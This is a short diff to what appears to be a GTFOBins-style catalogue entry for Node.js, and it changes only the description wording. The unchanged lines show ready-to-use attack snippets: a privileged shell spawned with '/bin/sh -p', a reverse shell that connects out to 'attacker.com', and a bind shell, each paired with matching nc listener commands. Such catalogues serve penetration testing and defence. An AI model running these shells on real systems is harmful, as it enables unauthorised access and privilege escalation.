@@ -10,7 +10,7 @@ functions:
     - code: |
         ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
   reverse-shell:
-    - description: Run `nc -l -p 12345` to receive the shell on the other end.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
@@ -21,7 +21,7 @@ functions:
           sh.stderr.pipe(this);
         });'
   bind-shell:
-    - description: Run `nc target.com 12345` to connect to the shell on the other end.
+    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
       code: |
         export LPORT=12345
         node -e 'sh = require("child_process").spawn("/bin/sh");
